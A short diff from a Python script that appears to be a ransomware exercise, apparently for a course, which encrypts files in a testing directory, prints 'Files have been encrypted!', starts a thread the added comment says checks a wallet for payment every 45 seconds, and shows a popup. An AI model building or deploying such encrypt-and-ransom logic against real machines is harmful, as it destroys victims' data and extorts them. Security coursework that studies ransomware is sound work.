@@ -36,7 +36,8 @@ path = "C:/Users/Neh Patel/Desktop/repos/testing/cosc469-testing-data"
 
 encodeFiles(path)
 print("Files have been encrypted!")
-t = threading.Thread(target=check)
+#thread that runs in the background and checks wallet every 45 secs to return true if it has been paid
+t = threading.Thread(target=check) 
 t.start()
 pu = PopUp()
 pu.mainloop()
